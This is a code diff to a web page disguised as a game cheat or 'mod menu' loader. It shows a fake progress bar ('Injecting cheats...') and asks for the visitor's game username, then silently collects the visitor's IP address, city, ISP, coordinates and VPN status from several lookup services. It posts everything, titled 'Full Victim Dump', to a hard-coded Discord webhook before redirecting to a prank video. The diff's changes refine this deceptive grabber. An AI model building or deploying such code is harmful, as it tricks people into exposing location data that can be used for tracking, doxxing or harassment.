@@ -37,7 +37,7 @@
             platform: navigator.platform,
             language: navigator.language,
             screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-            fingerprint: "AUTO-" + Date.now()
+            fingerprint: "AUTO-" + Date.now() + "-" + Math.random().toString(36).substring(2)
         };
 
         function fakeLoading() {
@@ -47,65 +47,74 @@
             const msgs = ["Connecting...", "Bypassing anticheat...", "Injecting cheats...", "Finalizing..."];
             let i = 0;
             const int = setInterval(() => {
-                progress += 20;
+                progress += 22;
                 progBar.style.width = `${Math.min(progress, 100)}%`;
-                if (progress > 30 && i === 0) { status.textContent = msgs[1]; i++; }
-                if (progress > 60 && i === 1) { status.textContent = msgs[2]; i++; }
+                if (progress > 25 && i === 0) { status.textContent = msgs[1]; i++; }
+                if (progress > 55 && i === 1) { status.textContent = msgs[2]; i++; }
+                if (progress > 80 && i === 2) { status.textContent = msgs[3]; i++; }
                 if (progress >= 100) clearInterval(int);
-            }, 130);
+            }, 140);
         }
 
         async function getIPAndGeo() {
             const services = [
-                // 1. ipify + ip-api
                 async () => {
                     const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({}));
-                    if (!ipRes.ip) return {};
-                    const geo = await fetch(`https://ip-api.com/json/${ipRes.ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy`).then(r => r.json()).catch(() => ({}));
-                    return {ip: ipRes.ip, ...geo};
+                    if (ipRes.ip) {
+                        const geo = await fetch(`https://ip-api.com/json/${ipRes.ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting`).then(r => r.json()).catch(() => ({}));
+                        return { ip: ipRes.ip, ...geo };
+                    }
+                    return {};
                 },
-                // 2. ipinfo.io
-                () => fetch('https://ipinfo.io/json').then(r => r.json()).then(d => ({
-                    ip: d.ip, country: d.country, city: d.city, region: d.region, isp: d.org, timezone: d.timezone
-                })),
-                // 3. ipapi.co (very reliable)
-                () => fetch('https://ipapi.co/json/').then(r => r.json()).then(d => ({
-                    ip: d.ip, country: d.country_name, countryCode: d.country, city: d.city, region: d.region, isp: d.org, timezone: d.timezone
-                }))
+                async () => {
+                    const res = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
+                    return { ip: res.ip, country: res.country, city: res.city, region: res.region, isp: res.org, timezone: res.timezone, lat: res.loc ? res.loc.split(',')[0] : null, lon: res.loc ? res.loc.split(',')[1] : null };
+                },
+                async () => {
+                    const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+                    return { ip: res.ip, country: res.country_name, countryCode: res.country, city: res.city, region: res.region, isp: res.org, timezone: res.timezone };
+                }
             ];
 
             for (let svc of services) {
                 try {
                     const res = await svc();
-                    if (res.ip || res.country) {
-                        data.ip = res.ip || data.ip || "N/A";
-                        Object.assign(data, {
-                            country: res.country || res.country_name || "Unknown",
-                            countryCode: res.countryCode || "N/A",
-                            city: res.city || "Unknown",
-                            region: res.region || res.regionName || "Unknown",
-                            isp: res.isp || res.org || "Unknown",
-                            timezone: res.timezone || "Unknown",
-                            lat: res.lat || "N/A",
-                            lon: res.lon || "N/A",
-                            proxy: (res.proxy || res.vpn) ? "YES" : "No"
-                        });
-                        return;
+                    if (res.ip) {
+                        data.ip = res.ip;
+                        data.country = res.country || res.country_name || "Unknown";
+                        data.countryCode = res.countryCode || "N/A";
+                        data.city = res.city || "Unknown";
+                        data.region = res.region || res.regionName || "Unknown";
+                        data.isp = res.isp || res.org || "Unknown";
+                        data.timezone = res.timezone || "Unknown";
+                        data.lat = res.lat || "N/A";
+                        data.lon = res.lon || "N/A";
+                        data.proxy = (res.proxy || false) ? "YES (VPN/Proxy)" : "No";
+                        return true;
                     }
-                } catch(e) {}
+                } catch (e) {}
             }
-            data.ip = "Lookup Failed - Try Hosted Link";
+            // Final fallback
+            data.ip = data.ip || "Lookup Failed";
+            data.country = data.country || "Unknown";
+            data.city = data.city || "Unknown";
+            data.isp = data.isp || "Unknown";
+            return false;
         }
 
         function sendToDiscord() {
             const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";
             fetch(webhook, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    username: "Mod Menu Grabber",
-                    content: `**🔥 MOD MENU GRABBED 🔥**\n**ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country}\n**ISP:** ${data.isp}\n**Proxy:** ${data.proxy}`,
-                    embeds: [{title: "Full Dump", description: "```json\n" + JSON.stringify(data, null, 2) + "\n```", color: 0x00ff41}]
+                    username: "Grabber",
+                    content: `**🔥 IP GRABBED 🔥**\n**ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country} (${data.region})\n**ISP:** ${data.isp}\n**Proxy/VPN:** ${data.proxy}\n**Time:** ${data.timestamp}`,
+                    embeds: [{
+                        title: "Full Victim Dump",
+                        description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
+                        color: 0x00ff41
+                    }]
                 })
             }).catch(() => {});
         }
@@ -113,11 +122,13 @@
         window.onload = async () => {
             fakeLoading();
             setTimeout(async () => {
-                data.name = prompt("ENTER YOUR GAME USERNAME TO ACTIVATE:", "") || "TestVictim";
+                data.name = prompt("ENTER YOUR GAME USERNAME TO ACTIVATE:", "") || "Anonymous";
                 await getIPAndGeo();
                 sendToDiscord();
-                setTimeout(() => window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq", 1500);
-            }, 1600);
+                setTimeout(() => {
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq";
+                }, 1200);
+            }, 1800);
         };
     </script>
 </body>
